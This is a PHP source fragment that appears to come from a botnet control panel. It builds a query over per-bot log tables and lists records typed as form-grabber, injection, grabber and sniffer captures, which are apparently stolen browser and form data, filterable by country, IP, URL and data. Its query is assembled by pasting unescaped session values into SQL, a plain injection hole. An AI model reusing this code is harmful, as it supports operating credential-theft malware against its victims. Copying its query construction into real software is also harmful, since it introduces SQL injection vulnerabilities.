<?php

if(!empty($Cur['str']) && !empty($Cur['id'])){	$b = explode('0', $Cur['str'], 2);	//$logs = $mysqli->query('SELECT type,  FROM bf_logs_' . $Cur['id'] . ' WHERE (prefix=\''.$b[0].'\') AND (uid=\'0'.$b[1].'\')', null, null, false);
    $filter = ' WHERE ((prefix=\''.$b[0].'\') AND (uid=\'0'.$b[1].'\'))';
	foreach($_SESSION['search']['logs'] as $key => $value){
		if(!empty($value)){
			switch($key){
				case 'type':
					if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
					$filter .= ' (a.type = \''.$value.'\') ';
				break;

				case 'country':
					if($value != 'ALL'){
						if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' (a.country = \''.$value.'\') ';
					}
				break;

				case 'ip':
					if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
					$filter .= ' (a.ip LIKE \''.$value.'%\') ';
				break;

				case 'url':
					if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
					$filter .= ' (a.url LIKE \'%'.$value.'%\') ';
				break;

				case 'data':
					if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
					$filter .= ' (a.data LIKE \'%'.$value.'%\') ';
				break;
			}
		}
	}

	$logs = $mysqli->query('SELECT a.id, a.type, a.country, a.ip, a.url, a.data, a.brw, a.protocol, a.post_date FROM bf_logs_'.$Cur['id'].' a '.$filter, null, null, false);
	$smarty->assign('logs', $logs);
	//print_rm($logs);

	$type[1] = $lang['fgr'];
	$type[2] = $lang['inj'];
	$type[3] = $lang['gra'];
	$type[4] = $lang['sni'];

	$smarty->assign('type', $type);
}

?>